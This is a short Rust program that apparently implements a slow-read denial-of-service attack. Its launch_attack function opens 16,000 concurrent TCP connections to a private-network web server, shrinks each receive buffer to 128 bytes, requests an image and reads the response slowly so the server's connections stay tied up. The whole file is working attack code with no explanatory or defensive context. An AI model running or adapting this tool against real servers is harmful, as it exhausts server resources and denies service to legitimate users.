extern crate futures;
extern crate http;
extern crate tokio;

use futures::future::join_all;
use futures::prelude::*;
use http::Request;
use std::net::SocketAddr;
use tokio::io;
use tokio::io::Error;
use tokio::net::TcpStream;

fn main() {
    let mut futures = vec![];

    for _ in 0..16000 {
        futures.push(launch_attack());
    }

    join_all(futures).wait();
}

fn launch_attack() -> impl Future<Item=(), Error=Error> {
    const RECV_BUFFER_SIZE: usize = 128;

    let socket_addr: SocketAddr = "192.168.27.131:80".parse().unwrap();
    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();

    tcp_stream.set_recv_buffer_size(RECV_BUFFER_SIZE);

    println!("Changing buffer size to {} bytes", RECV_BUFFER_SIZE);
    println!("Buffer size actually changed to {} bytes", tcp_stream.recv_buffer_size().unwrap());

    let request = Request::get("https://ni.fe.up.pt/images/projects/PKyl13EDPj3HLxF4.png").body(()).unwrap();
    let request = build_http_request(&request);

    io::write_all(&tcp_stream, request).wait();

    let buf = vec![];

    io::read_to_end(tcp_stream, buf)
        .then(|_result| {
            Ok(())
        })
}

fn build_http_request(request: &Request<()>) -> String {
    let mut req_str = String::new();

    req_str.push_str(request.method().as_str());
    req_str.push_str(" ");
    req_str.push_str(request.uri().path_and_query().unwrap().as_str());
    req_str.push_str(" HTTP/1.1\r\n");

    req_str.push_str("Host: ");
    req_str.push_str(request.uri().host().unwrap());
    req_str.push_str("\r\nUser-Agent: rust\r\n");
    req_str.push_str("Accept: */*\r\n");

    req_str.push_str("\r\n");

    req_str
}
